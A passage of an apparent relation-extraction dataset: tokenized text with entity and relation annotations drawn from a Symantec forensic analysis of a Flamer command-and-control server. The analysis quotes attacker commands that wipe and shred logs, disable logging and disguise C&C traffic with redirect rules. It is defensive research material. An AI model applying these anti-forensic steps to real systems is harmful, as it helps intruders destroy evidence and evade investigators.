"CVE-2009", "-", "0563", "vulnerability", "."], ["-", "SabPub", "is", "different", "from", "MaControl", ",", "another", "bot", "used", "in", "APT", "attacks", "in", "February", "2012", ";", "SabPub", "was", "more", "effective", "because", "it", "stayed", "undetected", "for", "more", "than", "1.5", "months", "."], ["-", "the", "APT", "behind", "SabPub", "is", "active", "at", "the", "time", "of", "writing", "."], ["*", "Thanks", "to", "Aleks", "Gostev", "and", "Igor", "Soumenkov", "for", "the", "analysis", "."]]}, {"vertexSet": [[{"name": "W32.Flamer", "pos": [0, 1], "sent_id": 15, "type": "Malware"}], [{"name": "Middle East", "pos": [10, 12], "sent_id": 15, "type": "Region"}], [{"name": "Symantec", "pos": [0, 1], "sent_id": 17, "type": "Organization"}], [{"name": "CERT-Bund/BSI", "pos": [14, 19], "sent_id": 19, "type": "Organization"}], [{"name": "IMPACT", "pos": [20, 21], "sent_id": 19, "type": "Organization"}], [{"name": "Kaspersky", "pos": [23, 24], "sent_id": 19, "type": "Organization"}], [{"name": "Flamer", "pos": [9, 10], "sent_id": 21, "type": "Attacker"}], [{"name": "May 18, 2012", "pos": [7, 11], "sent_id": 22, "type": "Time"}], [{"name": "March 25, 2012", "pos": [7, 11], "sent_id": 24, "type": "Time"}], [{"name": "record a minimal amount of information", "pos": [7, 13], "sent_id": 25, "type": "MalwareCharacteristics"}], [{"name": "Newsforyou", "pos": [13, 14], "sent_id": 33, "type": "Indicator"}], [{"name": "W32.Flamer", "pos": [3, 4], "sent_id": 34, "type": "Malware"}], [{"name": "May 18, 2012", "pos": [13, 17], "sent_id": 58, "type": "Time"}], [{"name": "11:26 (UTC)", "pos": [1, 5], "sent_id": 59, "type": "Time"}], [{"name": "13:53", "pos": [9, 10], "sent_id": 60, "type": "Time"}], [{"name": "W32.Flamer", "pos": [6, 7], "sent_id": 61, "type": "Malware"}], [{"name": "16:15", "pos": [11, 12], "sent_id": 61, "type": "Time"}], [{"name": "March 25, 2012", "pos": [10, 14], "sent_id": 62, "type": "Time"}], [{"name": "Newsforyou", "pos": [14, 15], "sent_id": 66, "type": "Exploit"}], [{"name": "W32.Flamer", "pos": [19, 20], "sent_id": 66, "type": "Malware"}], [{"name": "Logging activities were disabled", "pos": [0, 4], "sent_id": 81, "type": "Event"}], [{"name": "existing log files were securely deleted", "pos": [5, 11], "sent_id": 81, "type": "Event"}], [{"name": "UnloadChecker.php", "pos": [57, 58], "sent_id": 91, "type": "Malware"}], [{"name": "Eraser.py", "pos": [0, 1], "sent_id": 93, "type": "File"}], [{"name": "pycleanscr", "pos": [6, 7], "sent_id": 96, "type": "Indicator"}], [{"name": "dnslocation.info", "pos": [9, 10], "sent_id": 114, "type": "MalwareCharacteristics"}], [{"name": "Connection.py", "pos": [24, 25], "sent_id": 114, "type": "File"}], [{"name": "May 18", "pos": [5, 7], "sent_id": 119, "type": "Time"}], [{"name": "pycleanscr", "pos": [14, 15], "sent_id": 121, "type": "File"}], [{"name": "Delete.php", "pos": [0, 1], "sent_id": 124, "type": "File"}], [{"name": "LogWiper_fixed.txt", "pos": [2, 3], "sent_id": 126, "type": "File"}], [{"name": "Shred", "pos": [39, 40], "sent_id": 129, "type": "Exploit"}], [{"name": "W32.Flamer", "pos": [11, 12], "sent_id": 130, "type": "Attacker"}], [{"name": "This function was added by D***, returns a true/false value depending on if this is a Windows box", "pos": [0, 24], "sent_id": 144, "type": "Indicator"}], [{"name": "D***", "pos": [31, 35], "sent_id": 145, "type": "Attacker"}], [{"name": "H*****", "pos": [0, 6], "sent_id": 146, "type": "Attacker"}], [{"name": "O******", "pos": [0, 7], "sent_id": 147, "type": "Attacker"}], [{"name": "R***", "pos": [9, 13], "sent_id": 147, "type": "Attacker"}], [{"name": "index.php", "pos": [9, 10], "sent_id": 156, "type": "File"}], [{"name": "PROTOCOL_OLD*", "pos": [4, 6], "sent_id": 163, "type": "Indicator"}], [{"name": "PROTOCOL_SIGNUP", "pos": [10, 11], "sent_id": 163, "type": "Indicator"}], [{"name": "PROTOCOL_OLD_E**", "pos": [14, 17], "sent_id": 163, "type": "Indicator"}], [{"name": "PROTOCOL_RED", "pos": [21, 22], "sent_id": 163, "type": "Indicator"}], [{"name": "W32.Flamer", "pos": [31, 32], "sent_id": 163, "type": "Malware"}], [{"name": "CLIENT_TYPE_SP", "pos": [81, 82], "sent_id": 165, "type": "TrojanHorse"}], [{"name": "CLIENT_TYPE_SPE", "pos": [85, 86], "sent_id": 165, "type": "TrojanHorse"}], [{"name": "CLIENT_TYPE_FL", "pos": [89, 90], "sent_id": 165, "type": "TrojanHorse"}], [{"name": "CLIENT_TYPE_IP", "pos": [93, 94], "sent_id": 165, "type": "TrojanHorse"}], [{"name": "0xfccd97e2513089e74ba707bbf4c1b0e5", "pos": [6, 7], "sent_id": 195, "type": "MD5"}], [{"name": "59c5452fb2ba21091513ccdc1e0ec7fd", "pos": [7, 8], "sent_id": 195, "type": "Payload"}], [{"name": "username", "pos": [37, 38], "sent_id": 199, "type": "UserName"}], [{"name": "27934e96d90d06818674b98bec7230fa", "pos": [3, 4], "sent_id": 200, "type": "Hash"}], [{"name": "news_user", "pos": [6, 7], "sent_id": 224, "type": "UserName"}], [{"name": "news_pass", "pos": [7, 8], "sent_id": 224, "type": "Password"}], [{"name": "27934e96d90d06818674b98bec7230fa", "pos": [47, 48], "sent_id": 227, "type": "Hash"}], [{"name": "Israel", "pos": [15, 16], "sent_id": 255, "type": "Country"}]], "labels": [{"r": "P32", "h": 0, "t": 1, "evidence": [15]}, {"r": "P33", "h": 6, "t": 7, "evidence": [21, 22]}, {"r": "P21", "h": 10, "t": 11, "evidence": [33, 34]}, {"r": "P33", "h": 15, "t": 17, "evidence": [61, 62]}, {"r": "P33", "h": 15, "t": 12, "evidence": [58, 61]}, {"r": "P33", "h": 15, "t": 13, "evidence": [59, 61]}, {"r": "P33", "h": 15, "t": 14, "evidence": [60, 61]}, {"r": "P33", "h": 15, "t": 16, "evidence": [61]}, {"r": "P23", "h": 32, "t": 31, "evidence": [129, 130]}, {"r": "P21", "h": 42, "t": 43, "evidence": [163]}, {"r": "P21", "h": 41, "t": 43, "evidence": [163]}, {"r": "P21", "h": 40, "t": 43, "evidence": [163]}, {"r": "P21", "h": 39, "t": 43, "evidence": [163]}], "title": "201205SymantecFlamer", "sents": [["Security", "Response", "Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C"], ["Server", "Symantec", "Security", "Response", "Contents", "Overview", ".............................................................", "1", "Background", ".........................................................", "2"], ["The", "server", "...........................................................", "3"], ["The", "home", "directory", ".............................................", "6"], ["Stress", "testing", "in", "applications", "........................"], ["6", "Cleaning", "up", "...................................................."], ["7", "Disabling", "logging", "...........................................", "7"], ["The", "Web", "application", "...........................................", "7", "Authors", "..........................................................", "8"], ["Protocols", "........................................................", "9", "Stolen", "Data", "..................................................", "11"], ["Activity", ".........................................................", "13", "Payload", "........................................................"], ["14"], ["The", "control", "panel", "..............................................", "14"], ["The", "database", ".....................................................", "16"], ["Schema", ".......................................................", "16"], ["Conclusion", "........................................................", "18", "Resources", ".........................................................", "19", "Overview"], ["W32.Flamer", "is", "a", "sophisticated", "cyber", "espionage", "tool", "that", "targeted", "the", "Middle", "East", "."], ["It", "is", "modular", "in", "design", "and", "contains", "some", "novel", "functionality", ",", "most", "notably", "its", "ability", "to", "spread", "across", "networks", "using", "a", "previously", "unknown", "man", "-", "in", "-", "the", "-", "middle", "attack", "against", "Windows", "Update", "."], ["Symantec", "has", "performed", "a", "detailed", "forensic", "analysis", "of", "two", "of", "the", "command", "-", "and", "-", "control", "(", "C&C", ")", "servers", "used", "in", "the", "W32.Flamer", "attacks", "from", "earlier", "this", "year", "."], ["Based", "on", "our", "analysis", ",", "we", "were", "able", "to", "uncover", "details", "such", "as", "when", "the", "servers", "were", "operational", ",", "what", "entities", "were", "targeted", ",", "nicknames", "of", "those", "involved", "in", "the", "attack", ",", "and", "techniques", "used", "by", "the", "attackers", "to", "avoid", "discovery", "should", "the", "command", "-", "and", "-", "control", "server", "be", "compromised", "."], ["Analysis", "of", "these", "C&C", "servers", "was", "performed", "as", "a", "joint", "effort", "between", "Symantec", ",", "CERT", "-", "Bund", "/", "BSI", ",", "IMPACT", ",", "and", "Kaspersky", "."], ["This", "paper", "focuses", "on", "the", "detailed", "forensic", "examination", "Symantec", "carried", "out", "on", "the", "C&C", "server", "images", "."], ["Security", "Response", "Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Background"], ["The", "first", "server", "was", "set", "up", "on", "May", "18", ",", "2012", ",", "and", ",", "just", "five", "hours", "after", "it", "was", "set", "up", ",", "it", "recorded", "the", "first", "interaction", "with", "a", "Flamer", "-", "compromised", "client", "."], ["The", "server", "would", "go", "on", "to", "control", "at", "least", "a", "few", "hundred", "compromised", "clients", "over", "the", "next", "few", "weeks", "."], ["The", "second", "server", "was", "set", "up", "on", "March", "25", ",", "2012", ",", "and", "controlled", "over", "a", "thousand", "clients", "in", "a", "period", "of", "just", "over", "one", "week", "."], ["The", "servers", "had", "been", "set", "up", "to", "record", "a", "minimal", "amount", "of", "information", "in", "case", "of", "discovery", "."], ["The", "systems", "were", "configured", "to", "disable", "any", "unnecessary", "logging", "events", "and", "entries", "in", "the", "database", "were", "deleted", "at", "regular", "intervals", "."], ["Existing", "log", "files", "were", "securely", "deleted", "from", "the", "servers", "on", "a", "regular", "basis", "."], ["These", "steps", "were", "taken", "in", "order", "to", "hamper", "any", "investigation", "should", "the", "server", "fall", "into", "the", "hands", "of", "investigators", "or", "law", "enforcement", "."], ["However", ",", "the", "attackers", "were", "not", "thorough", "enough", ",", "as", "files", "revealing", "the", "entire", "history", "of", "the", "servers", "\u2019", "setup", "were", "available", "and", "a", "limited", "Figure", "1", "set", "of", "encrypted", "records"], ["Data", "security", "compartmentalization", "used", "by", "W32.Flamer", "attackers", "in", "the", "database", "revealed", "that", "compromised", "clients", "had", "been", "connecting", "from", "the", "Middle", "East", "."], ["We", "were", "also", "able", "to", "recover", "the", "nicknames", "of", "four", "authors", "\u2014", "D", "*", "*"], ["*", ",", "H", "*", "*", "*", "*", "*", ",", "O", "*", "*", "*", "*", "*", "*", ",", "and", "R***\u2014who", "had", "worked", "on", "the", "code", "at", "various", "stages", "and", "on", "differing", "aspects", "of", "the", "project", "."], ["On", "both", "servers", "commandand", "-", "control", "activity", "happens", "through", "a", "Web", "application", "called", "Newsforyou", "."], ["It", "processes", "the", "W32.Flamer", "client", "interactions", "and", "provides", "a", "simple", "control", "panel", "."], ["The", "control", "panel", "allows", "the", "attackers", "to", "upload", "packages", "of", "code", "to", "deliver", "to", "compromised", "clients", ",", "and", "download", "packages", "containing", "stolen", "client", "data", "."], ["However", ",", "in", "a", "technique", "not", "previously", "seen", "before", "the", "uploaded", "and", "downloaded", "packages", "are", "encrypted", ",", "so", "infiltrating", "the", "command", "-", "and", "-", "control", "server", "does", "not", "reveal", "the", "code", "or", "the", "stolen", "client", "data", "."], ["The", "command-", "Page", "2"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "and", "-", "control", "server", "simply", "serves", "as", "a", "proxy", "for", "the", "data", "and", "the", "data", "is", "encrypted", "and", "decrypted", "offline", "by", "the", "attackers", "using", "keys", "unique", "to", "each", "client", "."], ["This", "application", "also", "contains", "functionality", "to", "communicate", "with", "clients", "compromised", "by", "malware", "other", "than", "Flamer", "."], ["The", "Web", "application", "was", "designed", "to", "be", "a", "framework", "for", "supporting", "different", "malware", "campaigns", "."], ["In", "addition", "to", "avoiding", "the", "compromise", "of", "their", "operations", ",", "preventing", "both", "the", "uploading", "of", "rogue", "code", "and", "viewing", "of", "stolen", "data", ",", "the", "setup", "also", "maintains", "a", "clear", "distinction", "of", "roles", "."], ["The", "roles", "include", "those", "responsible", "for", "setting", "up", "the", "server", "(", "admins", ")", ",", "those", "responsible", "for", "uploading", "packages", "and", "downloading", "stolen", "data", "through", "the", "control", "panel", "(", "operators", ")", ",", "and", "those", "holding", "the", "private", "key", "with", "the", "ability", "to", "decrypt", "the", "stolen", "data", "(", "attack", "coordinators", ")", "."], ["The", "operators", "themselves", "may", "actually", "be", "completely", "unaware", "of", "the", "contents", "in", "the", "stolen", "data", "."], ["This", "is", "due", "to", "design", "of", "the", "process", "to", "use", "data", "security", "compartmentalization", "techniques", ",", "as", "shown", "in", "Figure", "1", "."], ["Despite", "these", "techniques", ",", "we", "were", "still", "able", "to", "determine", "that", "one", "of", "the", "servers", "delivered", "a", "module", "instructing"], ["Flamer", "to", "commit", "suicide", "and", "wipe", "itself", "off", "computers", "in", "late", "May", "2012", ",", "an", "action", "we", "also", "witnessed", "through", "compromised", "honeypots", "."], ["Finally", ",", "access", "to", "the", "control", "panel", "required", "a", "password", "which", "is", "stored", "as", "a", "hash", "."], ["Despite", "brute", "force", "attempts", "at", "reversing", "the", "hash", "to", "plain", "text", ",", "we", "were", "unable", "to", "determine", "the", "plain", "text", "password", "."], ["What", "follows", "is", "a", "thorough", "analysis", "of", "one", "of", "the", "command", "-", "and", "-", "control", "servers", ",", "detailing", "the", "server", "setup", ",", "the", "Web", "application", "developed", "by", "at", "least", "four", "separate", "authors", "since", "2006", ",", "the", "control", "panel", "used", "by", "the", "operators", ",", "and", "the", "database", "that", "helps", "drive", "the", "application", "."], ["The", "report", "also", "includes", "key", "information", "about", "a", "second", "server", ",", "but", "in", "-", "depth", "details", "have", "been", "omitted", "to", "maintain", "the", "brevity", "of", "this", "report", "."], ["The", "functionality", "and", "structure", "of", "both", "servers", "is", "identical", "."], ["The", "differences", "are", "mainly", "in", "the", "amount", "of", "data", "and", "number", "of", "clients", "the", "servers", "were", "exposed", "to", "."], ["The", "server", "File", "system"], ["The", "following", "table", "details", "the", "important", "locations", "relevant", "to", "the", "investigation", "of", "the", "command", "-", "and", "-", "control", "servers", "."], ["Table", "1", "Location", "Description", "/root/.bash_history"], ["Contains", "a", "history", "of", "root", "user", "commands", "/var", "/", "spool", "/", "crontabs", "/", "root", "Scripts", "set", "up", "to", "run", "at", "regular", "intervals", "//home/[USERNAME", "]"], ["Operator", "home", "directory", ",", "contains", "various", "scripts", "/var", "/", "www", "/", "htdocs", "/", "newsforyou", "Command", "-", "and", "-", "Control", "Web", "application", "/var", "/", "lib", "/", "mysql", "MySQL", "database", "Server", "setup"], ["The", "first", "sign", "of", "activity", "from", "the", "attackers", "on", "the", "first", "server", "was", "May", "18", ",", "2012", "."], ["At", "11:26", "(", "UTC", ")", "the", "first", "scheduled", "job", "was", "run", "and", "a", "little", "over", "two", "hours", "later", "the", "server", "was", "fully", "operational", "."], ["A", "malicious", "package", "was", "uploaded", "to", "the", "server", "at", "13:53", "."], ["The", "first", "recorded", "interaction", "with", "a", "W32.Flamer", "compromised", "client", "was", "at", "16:15", ",", "when", "stolen", "data", "was", "uploaded", "to", "the", "server", "."], ["In", "comparison", ",", "the", "second", "server", "saw", "initial", "activity", "on", "March", "25", ",", "2012", ",", "and", "was", "fully", "operational", "on", "the", "same", "day", "."], ["Page", "3", "Security", "Response"], ["Have"], ["I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "During", "the", "server", "set", "up", ",", "the", "attackers", "installed", "various", "applications", "and", "tested", "connections", "to", "the", "MySQL", "database", "which", "supported", "their", "custom", "Web", "application", "."], ["The", "end", "goal", "was", "to", "install", "a", "command", "-", "and", "-", "control", "application", "called", "Newsforyou", "which", "interacted", "with", "compromised", "W32.Flamer", "clients", "."], ["An", "important", "step", "taken", "by", "the", "attackers", "was", "to", "hide", "traces", "of", "their", "activity", "on", "the", "server", "."], ["They", "did", "this", "by", "disabling", "logging", "and", "securely", "removing", "existing", "log", "files", "."], ["The", "attackers", ",", "however", ",", "did", "not", "clear", "out", "the", "history", "of", "commands", "issued", "through", "the", "console", "by", "the", "administrator", "(", "root", ")", "account", "."], ["This", "data", "was", "visible", "and", "was", "retrieved", "from", "the", "/root/.bash_history", "file", ",", "which", "revealed", "these", "activities", "."], ["The", "following", "table", "lists", "and", "describes", ",", "in", "brief", ",", "a", "subset", "of", "commands", "that", "are", "most", "relevant", "to", "the", "server", "set", "up", ":", "Table", "2", "Command", "Executed", "Description", "netstat", "\u2013", "an", "Checks", "open", "network", "connections", "telnet", "localhost", "3306", "Tests", "MySQL", "server", "is", "accepting", "connections", "nano", "apache2.conf", "Configures", "Web", "server", "adduser", "[", "USERNAME", "]", "Adds", "user", "[", "USERNAME", "]", "crontab", "/etc", "/"], ["cron.newsforyou", "Cronjob", "executes", "scripts", "at", "regular", "intervals", "openssl", "req", "-newkey"], ["rsa:1024", "-nodes", "-x509", "-days", "Creates", "SSL", "key", "python", "_", "_", "main__.py", "0", "2", "1", "\"", "127.0.0.1", "\"", "100", "100", "Simulator", "test", "to", "add", "entry", "(", "stolen", "data", ")", "python", "_", "_", "main__.py", "2", "1", "-", "2", "1", "\"", "127.0.0.1", "\"", "100", "Simulator", "test", "to", "retrieve", "news", "entry", "(", "payload", ")", "nano", "/etc", "/", "apache2", "/", "ports.conf"], ["Configures", "Web", "server", "to", "listen", "on", "TCP", "port", "443", "cp", "/home/[USERNAME]/LogWiper_fixed.txt", "/LogWiper.sh"], ["Prepares", "log", "wiper", "file", "as", "BASH", "script", "sh", "/LogWiper.sh", "Wipes", "logs", "and", "disables", "logging", "services", "mkdir", "/var", "/", "www", "/", "common/"], ["Creates", "folders", "to", "be", "used", "in", "redirection", "mkdir", "/var", "/", "www", "/", "wp", "-", "content/", "Creates", "folders", "to", "be", "used", "in", "redirection", "mkdir", "/var", "/", "www", "/", "pages/", "Creates", "folders", "to", "be", "used", "in", "redirection", "mkdir", "/var", "/", "www", "/", "services/", "Creates", "folders", "to", "be", "used", "in", "redirection", "nano", "/etc", "/", "apache2", "/", "sites", "-", "enabled", "/", "default", "-", "ssl", "Sets", "up", "URL", "redirects", "mkdir", "-p", "/var", "/", "www", "/", "cgi", "-", "bin", "Creates", "folders", "to", "be", "used", "in", "redirection", "mkdir"], ["-p", "/var", "/", "www", "/", "htdocs", "/", "newsforyou", "Create", "Web", "appplication", "folder", "php5", "..", "/DB_creation_script.php"], ["Creates", "database", "/etc", "/", "init.d", "/", "apache2", "restart", "Restarts", "Web", "server", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", "22", "-j", "ACCEPT"], ["Accepts", "connections", "on", "TCP", "port", "22(SSH", ")", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", "443", "-j", "ACCEPT", "Accepts", "connections", "on", "TCP", "port", "443(HTTPS", ")", "Following", "these", "commands", ",", "the", "Apache", "server", "was", "configured", "to", "listen", "on", "TCP", "ports", "443", "and", "8080", "."], ["The", "firewall", "was", "also", "reconfigured", "to", "allow", "connections", "over", "SSH", "and", "HTTPS", "."], ["Logging", "activities", "were", "disabled", "and", "existing", "log", "files", "were", "securely", "deleted", "where", "necessary", "."], ["The", "server", "is", "now", "ready", "to", "interact", "with", "compromised", "Flamer", "clients", "through", "the", "Newsforyou", "application", "."], ["The", "attackers", "also", "set", "up", "some", "URL", "redirections", "to", "disguise", "the", "true", "nature", "of", "the", "requests", "to", "an", "inexperienced", "eye", "."], ["They", "would", "appear", "to", "look", "like", "legitimate", "requests", "for", "regular", "looking", "folder", "names", "."], ["An", "example", "of", "one", "of", "the", "redirect", "rules", "is", "shown", "below", ":", "/etc", "/", "apache2", "/", "sites", "-", "available", "/", "default", "-", "ssl", "Page", "4"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "ScriptAlias", "/cgi", "-", "bin/", "/var", "/", "www", "/", "cgi", "-", "bin/", "<", "Directory", "\u201c", "/var", "/", "www", "/", "cgi", "-", "bin", "\u201d", ">"], ["AllowOverride", "None"], ["Options", "+", "ExecCGI", "-MultiViews", "+", "SymLinksIfOwnerMatch", "Order", "allow", ",", "deny"], ["Allow", "from", "all", "RewriteEngine", "on"], ["RewriteRule", "^counter\\.cgi$", "/newsforyou", "/", "index.php", "<", "/Directory", ">", "Scheduled", "tasks"], ["A", "cronjob", "was", "set", "up", "to", "periodically", "delete", "files", "from", "the", "file", "system", "and", "remove", "older", "entries", "from", "the", "database", ":", "/etc", "/", "cron.newsforyou", "Table", "3", "Repeat", "Interval", "Command", "2", "minutes", "/var", "/", "www", "/", "htdocs", "/", "newsforyou", "/", "UnloadChecker.php", ">", ">", "/var", "/", "log", "/", "newsforyou.log", "6", "hours", "*", "python", "/home/[USERNAME]/pycleaner", "/", "Eraser.py", "@Midnight", "php", "/home/[USERNAME]/delete.php", "UnloadChecker.php", ",", "which", "is", "executed", "every", "two", "minutes", ",", "retrieves", "data", "uploaded", "from", "the", "compromised", "computer", "and", "places", "it", "in", "a", "tar", "archive", "."], ["The", "archive", "could", "then", "be", "downloaded", "by", "the", "operators", "."], ["Eraser.py", "is", "a", "script", "used", "to", "wipe", "certain", "files", "and", "content", "from", "folders", "."], ["On", "one", "of", "the", "servers", "the", "operators", "made", "an", "error", "when", "setting", "up", "the", "scheduled", "task", "."], ["They", "used", "the", "folder", "name", "pycleaner", "when", "creating", "the", "task", ",", "but", "this", "folder", "does", "not", "exist", "."], ["The", "folder", "containing", "the", "script", "is", "pycleanscr", "."], ["As", "a", "result", ",", "the", "Eraser.py", "script", "was", "never", "automatically", "executed", "."], ["Figure", "2", "Communications", "between", "C&C", "server", "and", "compromised", "computers", "Figure", "2", "illustrates", "the", "simple", "setup", "now", "in", "place", "for", "communicating", "with", "W32.Flamer", "compromised", "clients", "."], ["The", "next", "sections", "discuss", "the", "files", "and", "applications", "of", "most", "interest", "to", "the", "investigation", ",", "along", "with", "their", "locations", "."], ["The", "analysis", "begins", "in", "the", "home", "directory", "of", "the", "unique", "added", "user", ",", "a", "folder", "that", "is", "created", "once", "the", "user", "is", "added", "during", "the", "initial", "set", "up", "."], ["The", "usernames", "here", "were", "Page", "5"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "short", "three", "-", "letter", "names", ",", "unique", "to", "each", "server", "."], ["The", "home", "directory"], ["Location", ":", "/home/[USERNAME", "]"], ["The", "following", "table", "contains", "the", "location", "and", "a", "brief", "description", "of", "the", "files", "and", "folders", "present", "in", "the", "user", "\u2019s", "home", "directory", ":", "Table", "4", "File", "/", "Directory", "Description", "./.bashrc"], ["Standard", ".bashrc", "with", "no", "modifications", "Simulator/", "Python", "application", "used", "to", "test", "the", "Newsforyou", "application", "pycleanscr/", "Python", "application", "used", "to", "free", "up", "disk", "space", "if", "necessary", "./LogWiper_fixed.txt"], ["Script", "which", "disables", "logging", "and", "securely", "deletes", "specific", "log", "files", "./RequestHandler.php"], ["Used", "in", "the", "Newsforyou", "Web", "application", "./Delete.php", "PHP", "script", "which", "delete", "files", "and", "entries", "in", "the", "MySQL", "database", "Stress", "testing", "the", "application"], ["Simulator"], ["This", "application", "consists", "of", "a", "set", "of", "Python", "scripts", ",", "which", "are", "used", "to", "stress", "test", "the", "Newsforyou", "application", "."], ["This", "application", "was", "only", "present", "on", "one", "of", "the", "servers", "."], ["The", "application", "connects", "to", "a", "chosen", "server", "and", "issues", "various", "queries", "that", "conform", "to", "the", "C&C", "server", "protocol", "."], ["The", "tests", "performed", "during", "the", "set", "up", "were", "to", "add", "an", "entry", "(", "stolen", "data", ")", "and", "to", "retrieve", "a", "news", "entry", "(", "payload", ")", "."], ["A", "point", "of", "interest", "here", "is", "the", "presence", "of", "dnslocation.info", "as", "part", "of", "the", "HTTP", "request", "header", "the", "script", "builds", "in", "a", "file", "named", "Connection.py", "."], ["This", "is", "a", "known", "Flamer", "C&C", "server", "domain", ",", "indicating", "that", "the", "code", "is", "being", "shared", "and", "used", "to", "test", "across", "various", "C&C", "servers", "."], ["The", "timestamp", "on", "this", "file", "supports", "this", "idea", "as", "it", "is", "stamped", "March", "22", ",", "2012", "."], ["When", "a", "Python", "script", "is", "executed", ",", "a", "compiled", "Python", "file", "(", ".pyc", ")", "is", "generated", "."], ["Examining", "these", "files", ",", "we", "confirmed"], ["this", "application", "was", "executed", "on", "May", "18", "which", "corroborates", "our", "finding", "about", "the", "system", "configuration", "date", "."], ["Page", "6"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "Cleaning", "up", "pycleanscr", "pycleanscr", "checks", "how", "much", "free", "disk", "space", "is", "available", "on", "the", "root", "partition", "."], ["It", "deletes", "the", "files", "in", "/var", "/", "www/", "htdocs", "/", "newsforyou", "/", "tmp/"], ["if", "the", "amount", "of", "the", "disk", "space", "in", "use", "is", "greater", "than", "75", "percent", "."], ["Delete.php"], ["Deletes", "entries", "in", "the", "news_entries", "table", "of", "the", "MySQL", "database", "and", "securely", "deletes", "the", "files", "referenced", "by", "that", "entry", "on", "disk", "that", "are", "older", "than", "30", "days", "."], ["Disabling", "logging", "LogWiper_fixed.txt"], ["This", ".txt", "file", "is", "renamed", "to", "a", ".sh", "BASH", "script", "and", "run", "to", "disable", "logging", "services", ",", "to", "securely", "delete", "any", "prior", "log", "files", "created", ",", "and", "to", "disable", "logging", "in", "two", "particular", "applications", "required", "by", "the", "attackers", ":", "Apache", "and", "SSH", "."], ["Table", "5", "Log", "files", "deleted", "Services", "disabled", "Services", "with", "logging", "disabled", "/var", "/", "log", "/", "wtmp", "Rsyslog", "Apache", "/var", "/", "log", "/", "lastlog", "Sysklogd", "SSH", "/var", "/", "run", "/", "utmp", "Msyslog", "/var", "/", "log", "/", "mail", "."], ["*", "syslog", "-", "ng", "/var", "/", "log", "/", "syslog", "*", "/var", "/", "log", "/", "messages", "hidden", "files", "in", "/root", "and", "/", "home", "/var", "/", "log", "/", "auth/", "*", "/var", "/", "log", "/", "apache2/", "*", "Files", "are", "securely", "deleted", "using", "Shred", ",", "a", "tool", "that", "repeatedly", "overwrites", "files", "to", "prevent", "their", "recovery", ",", "even", "forensically", "."], ["The", "next", "section", "will", "discuss", "the", "Web", "application", "processing", "the", "compromised", "W32.Flamer", "client", "requests", "."], ["The", "Web", "application", "Location", ":", "/var", "/", "www", "/", "htdocs", "/", "newsforyou/"], ["The", "Newsforyou", "application", "is", "written", "in", "PHP", "and", "contains", "the", "primary", "command", "-", "and", "-", "control", "functionality", "split", "into", "two", "parts", ":", "the", "main", "module", "and", "the", "control", "panel", "."], ["The", "control", "panel", "is", "a", "basic", "user", "interface", "which", "allows", "packages", "to", "be", "uploaded", "and", "installed", "on", "chosen", "W32.Flamer", "clients", "."], ["It", "also", "allows", "for", "the", "retrieval", "of", "stolen", "data", "that", "had", "been", "uploaded", "from", "these", "clients", "."], ["Page", "7"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "The", "table", "below", "describes", "the", "layout", "and", "offers", "a", "brief", "description", "of", "the", "components", "of", "the", "Newsforyou", "application", ":", "Table", "6", "Directories", "Description", "/newsforyou"], ["Main", "command", "and", "control", "application", "/newsforyou", "/", "news", "Encrypted", "packages", "distributed", "to", "all", "infected", "clients", "*", "/newsforyou", "/", "ads", "Encrypted", "packages", "distributed", "to", "chosen", "infected", "clients", "*", "*", "/newsforyou", "/", "entries", "Encrypted", "data", "uploaded", "from", "infected", "clients", "*", "*", "/newsforyou", "/", "files", "Temporary", "location", "for", "files", "when", "creating", "unloads", "/newsforyou", "/", "tmp", "Temporary", "files", "(", "database", "exports", ",", "tar", "archives", ")", "/newsforyou", "/", "bak", "Archives", "generated", "when", "unloading"], ["/newsforyou", "/", "CP", "Control", "panel", "*", "Symmetric", "encryption", "with", "known", "key", "*"], ["*", "Asymmetric", "encryption", "with", "known", "public", "key", ",", "private", "key", "unknown"], ["The", "application", "is", "designed", "to", "resemble", "a", "simple", "news", "/", "blog", "application", "."], ["This", "approach", "may", "serve", "to", "disguise", "the", "true", "nature", "of", "the", "application", "from", "any", "automation", "or", "casual", "inspection", "."], ["Although", "the", "code", "was", "running", "on", "a", "Linux", "server", ",", "it", "is", "likely", "some", "of", "the", "command", "-", "and", "-", "control", "servers", "were", "running", "Windows", ",", "or", "at", "least", "that", "the", "code", "was", "developed", "and", "tested", "on", "Windows", "computers", "."], ["The", "following", "comment", "was", "present", "in", "one", "of", "the", "PHP", "files", ":", "--"], ["This", "function", "was", "added", "by", "D", "*", "*", "*", ",", "returns", "a", "true", "/", "false", "value", "depending", "on", "if", "this", "is", "a", "Windows", "box", "Authors"], ["The", "PHP", "source", "code", "references", "four", "authors", ",", "identified", "in", "the", "table", "below", ",", "and", "also", "attributes", "to", "them", "particular", "functionality", "within", "the", "code", ":", "Table", "7", "@author", "Edited", "Files", "Dates", "D", "*", "*", "*", "33", "12/4/2006", "01/23/2007"], ["H", "*", "*", "*", "*", "*", "10", "09/02/2007"], ["O", "*", "*", "*", "*", "*", "*", "4", "12/3/2006", "R", "*", "*", "*", "1", "2011"], ["Control", "Panel", "Protocols", "Database", "Cleanup", "Encryption", "X", "X", "X", "X", "X", "X", "X", "X", "X", "X", "X"], ["It", "is", "clear", "that", "D", "*", "*", "*", "and", "H", "*", "*", "*", "*", "*", "had", "the", "most", "input", "into", "the", "project", ",", "having", "edited", "the", "most", "files", "in", "the", "application", "."], ["O", "*", "*", "*", "*", "*", "*", "and", "R", "*", "*", "*", "were", "tasked", "with", "database", "and", "cleanup", "operations", "and", "could", "easily", "have", "had", "little", "or", "no", "understanding", "of", "the", "inner", "workings", "of", "the", "application", "."], ["However", ",", "D", "*", "*", "*", "and", "H", "*", "*", "*", "*", "*", "have", "direct", "involvement", "in", "handling", "interactions", "with", "clients", ",", "as", "they", "worked", "on", "the", "protocols", 